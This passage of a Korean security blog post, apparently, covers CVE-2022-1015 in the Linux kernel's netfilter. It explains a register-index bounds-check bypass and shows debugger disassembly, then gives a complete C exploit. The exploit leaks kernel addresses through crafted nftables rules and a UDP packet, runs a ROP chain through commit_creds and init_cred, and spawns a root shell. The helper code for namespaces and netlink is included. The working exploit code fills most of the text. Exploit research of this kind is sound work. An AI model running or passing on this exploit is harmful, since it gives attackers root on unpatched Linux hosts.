-EINVAL; if (reg * NFT_REG32_SIZE + len \u003e sizeof_field(struct nft_regs, data)) return -ERANGE; return 0; } \u003e\u003e\u003e print(hex(((0xffffff00+0xe8)* 4 + (0x70))\u00260xffffffff)) 이런식으로 bypass 된다. 들어갈때 -4 해서 들어가니 잘 고려해주고, idx도 4 곱해진다는 걸 고려해서 릭을 할 수 있다.\n0xffffffff82000195 \u003c__do_softirq+405\u003e jne __do_softirq+650 \u003c__do_softirq+650\u003e 0xffffffff8200019b \u003c__do_softirq+411\u003e mov edx, dword ptr [rbp - 0x44] 0xffffffff8200019e \u003c__do_softirq+414\u003e mov rax, qword ptr gs:[0x1fbc0] __do_softirq 부분 정상적으로 종료 어디서 되는지 확인해보고, 이때 여기서 뭘 집어넣길래 이부분이 키 복구하는 쪽이라는 것을 알았다. 그래서 rbp-0x44의 정상적인 값을 찾았고, 그걸로 집어넣으면 된다. 마지막 부분에 soft_irq가 돌아가는 부분이 있어서 ROP 체인 실행시키고 나서 얘를 이용해서 나가면 된다.\npwndbg\u003e x/40xi 0xffffffff810bd765 0xffffffff810bd765 \u003cdo_softirq+117\u003e: pop rsp 0xffffffff810bd766 \u003cdo_softirq+118\u003e: mov BYTE PTR gs:[rip+0x7ef62416],0x0 # 0x1fb84 \u003chardirq_stack_inuse\u003e 0xffffffff810bd76e \u003cdo_softirq+126\u003e: and bh,0x2 0xffffffff810bd771 \u003cdo_softirq+129\u003e: je 0xffffffff810bd72c \u003cdo_softirq+60\u003e 0xffffffff810bd773 \u003cdo_softirq+131\u003e: sti 0xffffffff810bd774 \u003cdo_softirq+132\u003e: nop WORD PTR [rax+rax*1+0x0] 0xffffffff810bd77a \u003cdo_softirq+138\u003e: mov rbx,QWORD PTR [rbp-0x8] 0xffffffff810bd77e \u003cdo_softirq+142\u003e: leave 0xffffffff810bd77f \u003cdo_softirq+143\u003e: ret 0xffffffff810bd780 \u003cdo_softirq+144\u003e: call 0xffffffff810df6 pop rsp해줘서 돌아가는데, 이때 rbp까지 같이 맞춰주면 정상적으로 돌아갈 수 있다.\n*(uint64_t *)(udpbuf+i*8) = cur_stack + 0x3f88; i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + cliret; i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prbp;i++; *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f60;i++; *(uint64_t *)(udpbuf+i*8)= kernel_base + 0x100016d;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8)= 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f58;i++; //sfp *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f58;i++; //r15 *(uint64_t *)(udpbuf+i*8) = kernel_base + bpf_get_current_task;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + movrdirax;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prsi;i++; *(uint64_t *)(udpbuf+i*8) = data_base + data_init_nsproxy;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + switch_task_namespace;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prdi;i++; *(uint64_t *)(udpbuf+i*8) = data_base + data_init_cred;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + commit_creds;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + go;i++; 다음과 같은 체인을 이용해 미리 cli를 호출해주고, __do_softirq 부분 뒷부분을 많이 짤라서 편하게 할 수 있다. 그리고 권한 상승후 do_softirq로 나가줬다.\nExploit code #define _GNU_SOURCE #include #include #include #include #include #include \"utils.h\" #define prdi 0xa4f20 #define prsi 0xfd61e #define prdx 0x66a40 #define pushrax 0x463d5 #define ret 0x1fc #define prbp 0x802 #define stiret 0x65e115 // dec ecx #define cliret 0x5ec83a #define bpf_get_current_task 0x217de0 #define movrdirax 0x625d74 // 0xffffffff81625d74 : mov rdi, rax ; jne 0xffffffff81625d61 ; xor eax, eax ; ret #define data_init_nsproxy 0x202060 #define switch_task_namespace 0xe5c80 #define data_init_cred 0x2022a0 #define commit_creds 0xe74a0 #define go 0x22c92 // add rsp, 0x10 ; pop r12 ; pop r13 ; pop rbp ; ret static struct nftnl_rule *isolate_udp_pkt(uint8_t family, const char *table, const char *chain, const char * target_chain) { struct nftnl_rule *r = NULL; uint16_t port = 8888; r = nftnl_rule_alloc(); if (r == NULL) { perror(\"OOM\"); exit(EXIT_FAILURE); } nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); // meta load l4proto =\u003e reg 1 add_meta(r, NFT_META_L4PROTO, NFT_REG_1); uint8_t v = 17; add_cmp(r,NFT_REG_1 ,NFT_CMP_EQ,\u0026v,sizeof(v)); add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0,NFT_REG32_01, 2, 2); uint16_t dport = htons(port); add_cmp(r,NFT_REG32_01, NFT_CMP_EQ , \u0026dport, sizeof(dport)); add_verdict(r, NFT_JUMP, target_chain, NFT_REG_VERDICT); // TODO return r; } static struct nftnl_rule *edit_udp_data(uint8_t family, const char *table, const char *chain) { struct nftnl_rule *r = NULL; r = nftnl_rule_alloc(); if (r == NULL) { perror(\"OOM\"); exit(EXIT_FAILURE); } // enum nft_payload_bases { // NFT_PAYLOAD_LL_HEADER, // NFT_PAYLOAD_NETWORK_HEADER, // NFT_PAYLOAD_TRANSPORT_HEADER, // }; nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); int off = 0xfc; add_payload(r,NFT_PAYLOAD_TRANSPORT_HEADER,0xffffff00+off,0x0,0x8,0x70); // TODO return r; } static struct nftnl_rule *rop(uint8_t family, const char *table, const char *chain) { struct nftnl_rule *r = NULL; r = nftnl_rule_alloc(); if (r == NULL) { perror(\"OOM\"); exit(EXIT_FAILURE); } nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); int off = 0xd4; add_payload(r,NFT_PAYLOAD_TRANSPORT_HEADER,0x0,0xffffff00+off+4,0x8,0xff); // add_payload(r,NFT_PAYLOAD_TRANSPORT_HEADER,0x0,1,0x8,0x8); // TODO return r; } void install_rule_for_leak() { if(create_rule(isolate_udp_pkt(NFPROTO_IPV4, \"filter\", \"input\", \"leak\")) == 0 ){ perror(\"error creating rule\"); exit(EXIT_FAILURE); } if(create_rule(edit_udp_data(NFPROTO_IPV4, \"filter\", \"leak\")) == 0 ){ perror(\"error creating rule\"); exit(EXIT_FAILURE); } } void install_rule_for_rop(){ if(create_rule(isolate_udp_pkt(NFPROTO_IPV4, \"filter\", \"input2\", \"rop\")) == 0 ){ perror(\"error creating rule\"); exit(EXIT_FAILURE); } if(create_rule(rop(NFPROTO_IPV4, \"filter\", \"rop\")) == 0 ){ perror(\"error creating rule\"); exit(EXIT_FAILURE); } } void udp_client(void * data){ int sockfd; struct sockaddr_in server_addr; char * buf = malloc(0x200); sockfd = socket(AF_INET, SOCK_DGRAM, 0); if (sockfd == -1) { perror(\"socket\"); exit(EXIT_FAILURE); } server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8888); inet_pton(AF_INET, \"127.0.0.1\", \u0026(server_addr.sin_addr)); if (connect(sockfd, (struct sockaddr *)\u0026server_addr, sizeof((server_addr))) == -1) { perror(\"connect\"); close(sockfd); exit(EXIT_FAILURE); } int res = write(sockfd, data, 0x200); close(sockfd); return 0; } void udp_server(void * buf){ struct sockaddr_in server_addr; socklen_t server_addr_len; struct sockaddr_in client_addr; socklen_t client_addr_len; char tmp[0x200]; client_addr_len = sizeof( client_addr); int fd = socket(AF_INET, SOCK_DGRAM, 0); server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8888); server_addr.sin_addr.s_addr=htonl(INADDR_ANY ); if (bind(fd, (struct sockaddr *)\u0026server_addr, sizeof(server_addr)) == -1) { perror(\"bind\"); close(fd); exit(EXIT_FAILURE); } recvfrom(fd, buf, 0x200,0,\u0026client_addr,client_addr_len);\trecvfrom(fd, tmp, 0x200,0,\u0026client_addr,client_addr_len);\treturn 0; } int main(int argc, char *argv[]) { int tid, status; pthread_t p_thread; unsigned char udpbuf[512] = {0,}; uint64_t kernel_base = 0; memset(udpbuf, 0x41, 512); new_ns(); system(\"ip link set lo up\"); printf(\"[+] Leak kernel base address\\n\"); printf(\" [-] install udp server\\n\"); uint64_t * buf = malloc(0x200); tid = pthread_create(\u0026p_thread, NULL, udp_server, buf); if (tid \u003c 0){ perror(\"thread create error : \"); exit(0); } printf(\" [-] setup nftables\\n\"); if(create_table(NFPROTO_IPV4, \"filter\", false) == 0){ perror(\"error creating table\"); exit(EXIT_FAILURE); } if(create_chain(\"filter\", \"input\", NF_INET_LOCAL_IN) == 0){ perror(\"error creating chain\"); exit(EXIT_FAILURE); } if(create_chain(\"filter\", \"leak\", 0) == 0){ perror(\"error creating chain\"); exit(EXIT_FAILURE); } install_rule_for_leak(); printf(\" [-] send \u0026 recv udp packet\\n\"); usleep(1000); udp_client(udpbuf); sleep(1); hexdump(buf,0x200); uint64_t data_base = buf[0] - 0x17e0d8; uint64_t cur_stack = buf[5] - 0x3fe8; kernel_base = buf[6] - 0x10000d9; printf(\" [-] kernel base address 0x%lx\\n\", kernel_base); printf(\" [-] leaked 0x%lx\\n\", cur_stack); printf(\" [-] leaked 0x%lx\\n\", data_base); delete_chain(\"filter\",\"input\"); delete_chain(\"filter\",\"leak\"); puts(\"[+] Ropping\"); if(create_chain(\"filter\", \"rop\", 0) == 0){ perror(\"error creating chain\"); exit(EXIT_FAILURE); } if(create_chain(\"filter\", \"input2\", NF_INET_LOCAL_IN) == 0){ perror(\"error creating chain\"); exit(EXIT_FAILURE); } install_rule_for_rop(); puts(\" [-] install rop chain\"); memset(udpbuf, 0x41, 512); int i = 0; *(uint64_t *)(udpbuf+i*8) = cur_stack + 0x3f88; i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + cliret; i++;\t*(uint64_t *)(udpbuf+i*8) = kernel_base + prbp;i++; *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f60;i++; *(uint64_t *)(udpbuf+i*8)= kernel_base + 0x100016d;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8)= 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f58;i++; //sfp *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f58;i++; //r15 *(uint64_t *)(udpbuf+i*8) = kernel_base + bpf_get_current_task;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + movrdirax;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prsi;i++; *(uint64_t *)(udpbuf+i*8) = data_base + data_init_nsproxy;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + switch_task_namespace;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prdi;i++; *(uint64_t *)(udpbuf+i*8) = data_base + data_init_cred;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + commit_creds;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + go;i++; puts(\" [-] install udp client\"); udp_client(udpbuf); pthread_join(p_thread, (void **)\u0026status); puts(\" [-] Spawning sh\"); system(\"/bin/sh\"); return 0; } // 306 // rbp-0x40 = 0xffffc6ca // \u003e // cli ret // 0xffffffff8200016d - 0x100016d WAKEUP #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include void pin_cpu(int cpu) { cpu_set_t set; CPU_ZERO(\u0026set); CPU_SET(cpu, \u0026set); if (sched_setaffinity(0, sizeof(cpu_set_t), \u0026set)) { printf(\"error\\n\"); exit(-1); } } bool create_table(uint32_t protocol, char * table_name, bool delete){ struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, table_seq, chain_seq, family; struct nftnl_table *t; struct mnl_nlmsg_batch *batch; int ret, batching; t = nftnl_table_alloc(); if (t == NULL) { perror(\"nftnl_table_alloc\"); return false; } nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, protocol); nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name); batching = nftnl_batch_is_supported(); if (batching \u003c 0) { perror(\"cannot talk to nfnetlink\"); return false; } seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); if (batching) { nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } table_seq = seq; nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), delete?NFT_MSG_DELTABLE:NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_table_nlmsg_build_payload(nlh, t); nftnl_table_free(t); mnl_nlmsg_batch_next(batch); if (batching) { nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\"mnl_socket_open\"); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u003c 0) { perror(\"mnl_socket_bind\"); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u003c 0) { perror(\"mnl_socket_send\"); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u003e 0) { ret = mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL); if (ret \u003c= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\"error\"); return false; } mnl_socket_close(nl); return true; } bool create_chain(char * table_name, char * chain_name, uint32_t hook_num){ // NF_INET_LOCAL_IN struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, chain_seq; int ret, family; struct nftnl_chain *t; struct mnl_nlmsg_batch *batch; int batching; t = nftnl_chain_alloc(); if (t == NULL) return false; nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name); nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name); if(hook_num != 0) nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hook_num); nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0); batching = nftnl_batch_is_supported(); if (batching \u003c 0) { perror(\"cannot talk to nfnetlink\"); return false; } seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); if (batching) { nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } chain_seq = seq; nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_chain_nlmsg_build_payload(nlh, t); nftnl_chain_free(t); mnl_nlmsg_batch_next(batch); if (batching) { nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\"mnl_socket_open\"); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u003c 0) { perror(\"mnl_socket_bind\"); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u003c 0) { perror(\"mnl_socket_send\"); return false; } ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u003e 0) { ret = mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL); if (ret \u003c= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\"error\"); return false; } mnl_socket_close(nl); return true; } bool delete_chain(char * table_name, char * chain_name){ struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, chain_seq; int ret, family; struct nftnl_chain *t; struct mnl_nlmsg_batch *batch; int batching; t = nftnl_chain_alloc(); if (t == NULL) return false; nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name); nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name); seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); chain_seq = seq; nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_chain_nlmsg_build_payload(nlh, t); nftnl_chain_free(t); mnl_nlmsg_batch_next(batch); nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\"mnl_socket_open\"); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u003c 0) { perror(\"mnl_socket_bind\"); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u003c 0) { perror(\"mnl_socket_send\"); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u003e 0) { ret = mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL); if (ret \u003c= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\"error\"); return false; } mnl_socket_close(nl); return true; } bool create_rule(struct nftnl_rule * r) { struct mnl_socket *nl; struct nlmsghdr *nlh; struct mnl_nlmsg_batch *batch; char buf[MNL_SOCKET_BUFFER_SIZE]; uint32_t seq = time(NULL); int ret; nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\"mnl_socket_open\"); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u003c 0) { perror(\"mnl_socket_bind\"); return false; } batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY), NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++); nftnl_rule_nlmsg_build_payload(nlh, r); nftnl_rule_free(r); mnl_nlmsg_batch_next(batch); nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)); if (ret == -1) { perror(\"mnl_socket_sendto\"); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); if (ret == -1) { perror(\"mnl_socket_recvfrom\"); return false; } ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl), NULL, NULL); if (ret \u003c 0) { perror(\"mnl_cb_run\"); return false; } mnl_socket_close(nl); return true; } static void add_meta(struct nftnl_rule *r, uint32_t key, uint32_t dreg) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"meta\"); if (e == NULL) { perror(\"expr payload oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_META_KEY, key); nftnl_expr_set_u32(e, NFTNL_EXPR_META_DREG, dreg); nftnl_rule_add_expr(r, e); } static void add_cmp(struct nftnl_rule *r, uint32_t sreg, uint32_t op, const void *data, uint32_t data_len) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"cmp\"); if (e == NULL) { perror(\"expr cmp oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_SREG, sreg); nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_OP, op); nftnl_expr_set(e, NFTNL_EXPR_CMP_DATA, data, data_len); nftnl_rule_add_expr(r, e); } static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t sreg, uint32_t dreg, uint32_t offset, uint32_t len) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"payload\"); if (e == NULL) { perror(\"expr payload oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base); if(sreg != 0) nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_SREG, sreg); if(dreg != 0) nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg); nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset); nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len); nftnl_rule_add_expr(r, e); } int add_verdict(struct nftnl_rule *r, int verdict, char * chain, u_int32_t dreg) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"immediate\"); if (e == NULL) { perror(\"expr payload oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, dreg); nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict); if(chain) nftnl_expr_set_str(e, NFTNL_EXPR_IMM_CHAIN, chain); nftnl_rule_add_expr(r, e); return 0; } void write_file(const char *filename, char *text) { int fd = open(filename, O_RDWR); write(fd, text, strlen(text)); close(fd); } void new_ns(void) { uid_t uid = getuid(); gid_t gid = getgid(); char buffer[0x100]; if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) { perror(\" [-] unshare(CLONE_NEWUSER | CLONE_NEWNS)\"); exit(EXIT_FAILURE); } if (unshare(CLONE_NEWNET)){ perror(\" [-] unshare(CLONE_NEWNET)\"); exit(EXIT_FAILURE); } write_file(\"/proc/self/setgroups\", \"deny\"); snprintf(buffer, sizeof(buffer), \"0 %d 1\", uid); write_file(\"/proc/self/uid_map\", buffer); snprintf(buffer, sizeof(buffer), \"0 %d 1\", gid); write_file(\"/proc/self/gid_map\", buffer); } #ifndef HEXDUMP_COLS #define HEXDUMP_COLS 16 #endif void hexdump(void *mem, unsigned int len) { unsigned int i, j; for(i = 0; i \u003c len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) { /* print offset */ if(i % HEXDUMP_COLS == 0) { printf(\"0x%06x: \", i); } /* print hex data */ if(i \u003c len) { printf(\"%02x \", 0xFF \u0026 ((char*)mem)[i]); } else /* end of block, just aligning for ASCII dump */ { printf(\" \"); } /* print ASCII dump */ if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) { for(j = i - (HEXDUMP_COLS - 1); j \u003c= i; j++) { if(j \u003e= len) /* end of block, not really printing */ { putchar(' '); } else if(isprint(((char*)mem)[j])) /* printable char */ { putchar(0xFF \u0026 ((char*)mem)[j]); } else /* other char */ { putchar('.'); } } putchar('\\n'); } } } https://youtube.com/shorts/z0n_A8paaqU Exploit\n",
  "wordCount" : "4831",
  "inLanguage": "en",
  "datePublished": "2024-03-10T00:00:00Z",
  "dateModified": "2024-03-10T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/cve-2022-1015-linux-kernel-netfilter/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      CVE-2022-1015 Linux kernel netfilter
    </h1>
    <div class="post-meta">


March 2024

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#backgrounds" aria-label="Backgrounds">Backgrounds</a><ul>
                        
                <li>
                    <a href="#capabilites" aria-label="Capabilites">Capabilites</a></li>
                <li>
                    <a href="#namespace" aria-label="Namespace">Namespace</a></li>
                <li>
                    <a href="#netfilter-%ec%84%9c%eb%b8%8c%ec%8b%9c%ec%8a%a4%ed%85%9c" aria-label="Netfilter 서브시스템">Netfilter 서브시스템</a></li>
                <li>
                    <a href="#netlink-socket" aria-label="Netlink socket">Netlink socket</a></li>
                <li>
                    <a href="#nftables" aria-label="nftables">nftables</a></li></ul>
                </li>
                <li>
                    <a href="#cve-2022-1015" aria-label="CVE-2022-1015">CVE-2022-1015</a><ul>
                        <ul>
                        
                <li>
                    <a href="#nft_payload" aria-label="nft_payload">nft_payload</a></li>
                <li>
                    <a href="#nft_payload_ops" aria-label="nft_payload_ops">nft_payload_ops</a></li>
                <li>
                    <a href="#nft_payload_set_ops" aria-label="nft_payload_set_ops">nft_payload_set_ops</a></li></ul>
                    
                <li>
                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-code" aria-label="Exploit code">Exploit code</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
